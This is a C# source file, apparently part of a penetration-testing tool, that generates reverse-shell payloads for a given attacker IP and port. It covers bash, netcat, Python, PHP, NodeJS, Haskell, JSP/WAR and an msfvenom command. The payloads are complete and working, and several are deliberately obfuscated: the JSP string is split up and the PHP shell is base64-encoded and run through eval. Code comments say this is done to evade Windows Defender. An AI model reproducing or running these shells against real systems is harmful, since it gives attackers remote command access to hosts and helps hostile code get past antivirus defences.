using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Reecon
{
    class Shell
    {
        public static void GetInfo(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Shell Usage: reecon -shell shellType [IP Port]");
                Console.WriteLine("Types: bash, haskell, jar, jsp, nc, nodejs, php, python, war");
                General.PrintIPList();
                return;
            }
            string shellType = args[1];
            // If we have a tun0 IP, use that instead as the default
            List<General.IP> ipList = General.GetIPList();
            string ip = ipList.Any(x => x.Name == "tun0") ? ipList.FirstOrDefault(x => x.Name == "tun0").Address.ToString() : "10.0.0.1";
            string port = "9001";
            if (args.Length == 2)
            {
                Console.WriteLine("Don't forget to change the IP / Port!");
                General.PrintIPList();
            }
            if (args.Length == 3)
            {
                ip = args[2];
            }
            if (args.Length == 4)
            {
                ip = args[2];
                port = args[3];
            }
            if (shellType == "bash")
            {
                Console.WriteLine("Bash Shell");
                Console.WriteLine("----------");
                Console.WriteLine(BashShell(ip, port));
            }
            else if (shellType == "haskell")
            {
                Console.WriteLine("Haskell Shell");
                Console.WriteLine("-------------");
                Console.WriteLine(HaskellShell(ip, port));
                Console.WriteLine();
                Console.WriteLine("--> Save as filename.hs (Note: Only use letters - No numbers or special characters)");
            }
            else if (shellType == "jar")
            {
                Console.WriteLine("Java Shell");
                Console.WriteLine("----------");
                Console.WriteLine(JavaShell(ip, port));
                Console.WriteLine();
                Console.WriteLine("--> Can just use a normal nc listener");

            }
            else if (shellType == "jsp")
            {
                Console.WriteLine("JSP Shell");
                Console.WriteLine("---------");
                Console.WriteLine(JSPShell(ip, port));
                Console.WriteLine();
                Console.WriteLine("--> Save as file.jsp");
            }
            else if (shellType == "nc")
            {
                Console.WriteLine("Netcat Shell");
                Console.WriteLine("------------");
                Console.WriteLine(NCShell(ip, port));
            }
            else if (shellType == "nodejs")
            {
                Console.WriteLine("NodeJS Shell");
                Console.WriteLine("------------");
                Console.WriteLine(NodeJSShell(ip, port));
            }
            else if (shellType == "php")
            {
                Console.WriteLine("PHP Shell");
                Console.WriteLine("---------");
                Console.WriteLine(PHPShell(ip, port));
            }
            else if (shellType == "python")
            {
                Console.WriteLine("Python Shell");
                Console.WriteLine("------------");
                Console.WriteLine(PythonShell(ip, port));

            }
            else if (shellType == "sh")
            {
                Console.WriteLine("sh Shell");
                Console.WriteLine("--------");
                Console.WriteLine(SHShell(ip, port));
            }
            else if (shellType == "war")
            {
                Console.WriteLine("WAR Shell");
                Console.WriteLine("---------");
                Console.WriteLine(JSPShell(ip, port));
                Console.WriteLine();
                Console.WriteLine("--> Save as file.jsp");
                Console.WriteLine("--> zip file.war file.jsp");
            }
            else
            {
                Console.WriteLine("Unknown Shell: " + shellType);
            }
        }

        private static string BashShell(string ip, string port)
        {
            // http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
            string shell = $"bash -i >& /dev/tcp/{ip}/{port} 0>&1";
            string altShell = $"bash -i &>/dev/tcp/{ip}/{port} <&1";
            string saferShell = "bash -c \"" + shell + "\"";
            string saferAltShell = "bash -c \"" + altShell + "\"";
            string saferBase64Shell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(saferShell));
            string saferBase64AltShell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(altShell));
            string saferURLEncodedShell = $"bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22";
            string toReturn = "#!/bin/bash" + Environment.NewLine +
                               shell + Environment.NewLine +
                               "Note: File header is only required if it's a file and not a command" + Environment.NewLine +
                               "Safer: " + saferShell + Environment.NewLine +
                               "Safer Base64: " + saferBase64Shell + Environment.NewLine;
            if (saferBase64Shell.Contains("+") && !saferBase64AltShell.Contains("+"))
            {
                toReturn += "Alt Safer Base64 (No +): " + saferBase64AltShell + Environment.NewLine;
            }
            toReturn += $"Safer URL Encoded: " + saferURLEncodedShell;

            return toReturn;
        }

        private static string HaskellShell(string ip, string port)
        {
            return "module Main where" + Environment.NewLine
                    + "import System.Process" + Environment.NewLine
                    + $"main = callCommand \"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"";
        }
        private static string JavaShell(string ip, string port)
        {
            // Can catch with a default nc listener - No need to use metasploit
            // Should do a proper one later...
            return $"msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.jar";
        }

        private static string JSPShell(string ip, string port)
        {
            // Lots of spaces else Windows Defender complains about "Trojan:JS/Foretype.A!ml"
            // Even more spaces - It's gotten better....
            return "<%@page import=\"java.lang.* \"%>" + "<%@page import=\"java.util.* \"%><%@page import=\"java.io.* \"%><%@page import=\"java.net.* \"%><% class StreamC" + "onnector extends Thread {" + " InputStream is; Outpu" + "tStream os; StreamConnector( InputStre" + "am is, OutputStream os ) { this.is = is; this.os = os; }" + " public void run() { Buffere" + "dReader in = null; BufferedWriter out = null; try { in = new Buffered" + "Reader( new InputStreamReader( this.is ) ); out = " + "new BufferedWriter( new OutputStreamWriter( this.os ) ); char bu" + "ffer[] = new char[8192]; int lengt" + "h; while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) { out" + ".write( buffer, 0, length ); out.flush(); } } catch( Exception e ){} try {" + " if( in != null ) in.close(); if( out != null ) " + "out.close(); } catch( Exception e ){} } } try {" + Environment.NewLine
                    + "Socket so" + "cket = new Socket(\"" + ip + "\", " + port + ");" + Environment.NewLine
                    + "String ShellPath; if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) { ShellPath = new String(\"/bin/sh\"); } else { ShellPath = new String(\"cmd.exe\"); } "
                    + "Process process = Runtime." + "getRuntime().exec(ShellPath);" + Environment.NewLine
                    + "(new StreamConne" + "ctor(process.getIn" + "putStream(), socket.getOutpu" + "tStream()))" + ".start(); (new StreamCo" + "nnector(socket.ge" + "tInputStream(), process.getOutp" + "utStream())).start();} catch(E" + "xception e ) {} %>";
        }

        private static string NCShell(string ip, string port)
        {
            string shellOne = $"nc {ip} {port} -e /bin/sh";
            string shellTwo = $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
            return shellOne + Environment.NewLine + shellTwo;
        }

        private static string NodeJSShell(string ip, string port)
        {
            Console.WriteLine("Test: (function(){return \"Reelix\"})()");
            return $"require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f', ()=>{{}})";
        }

        private static string PHPShell(string ip, string port)
        {
            string plainShell = $"exec(\"/bin/bash -c 'bash -i > /dev/tcp/{ip}/{port} 0>&1'\");";
            string b64Shell = System.Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(plainShell));
            // Space is to bypass Windows Defender definitions
            // Still gets picked up by "bkav" though - Will deal with later if needed
            string evalShell = "eva" + "l(base64_decode('" + b64Shell + "'));";
            return "Regular: <?php " + plainShell + " ?>" + Environment.NewLine
                + "Safer: <?php " + evalShell + " ?>" + Environment.NewLine
                + "No Upload: php -r \"" + evalShell + "\"";
        }

        private static string PythonShell(string ip, string port)
        {
            return $"import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('{ip}', {port})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(['/bin/bash', '-i']);";
        }

        private static string SHShell(string ip, string port)
        {
            // Currently just the nc shell - Need one without it...
            return $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
        }
    }
}